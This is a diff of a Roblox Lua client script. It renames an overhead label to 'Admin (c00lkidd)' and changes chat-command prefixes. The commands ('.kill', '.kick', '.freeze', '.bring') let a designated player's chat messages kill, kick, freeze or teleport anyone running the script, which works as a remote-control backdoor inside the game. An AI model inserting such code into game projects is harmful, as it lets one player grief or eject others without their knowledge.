@@ -61,7 +61,7 @@ if game.PlaceId == PLACE_ID_TO_CHECK then
                 local textLabel = Instance.new("TextLabel")
                 textLabel.Size = UDim2.new(1, 0, 1, 0)
                 textLabel.BackgroundTransparency = 1
-                textLabel.Text = "Yönetici"
+                textLabel.Text = "Admin (c00lkidd)"
                 textLabel.TextStrokeTransparency = 0
                 textLabel.Font = Enum.Font.GothamBold
                 textLabel.Parent = billboard
@@ -90,23 +90,23 @@ if game.PlaceId == PLACE_ID_TO_CHECK then
         player.Chatted:Connect(function(message)
             message = string.lower(message)
 
-            if message == "/kill" then
+            if message == ".kill" then
                 if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                     LocalPlayer.Character.Humanoid.Health = 0
                 end
-            elseif message == "/kick" then
+            elseif message == ".kick" then
                 LocalPlayer:Kick("Yetkili tarafından oyundan atıldınız.")
-            elseif message == "/freeze" then
+            elseif message == ".freeze" then
                 if LocalPlayer.Character then
                     frozen = true
                     setAnchoredAllParts(LocalPlayer.Character, true)
                 end
-            elseif message == "/unfreeze" then
+            elseif message == ".unfreeze" then
                 if LocalPlayer.Character then
                     frozen = false
                     setAnchoredAllParts(LocalPlayer.Character, false)
                 end
-            elseif message == "/bring" then
+            elseif message == ".bring" then
                 if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                     LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                 end
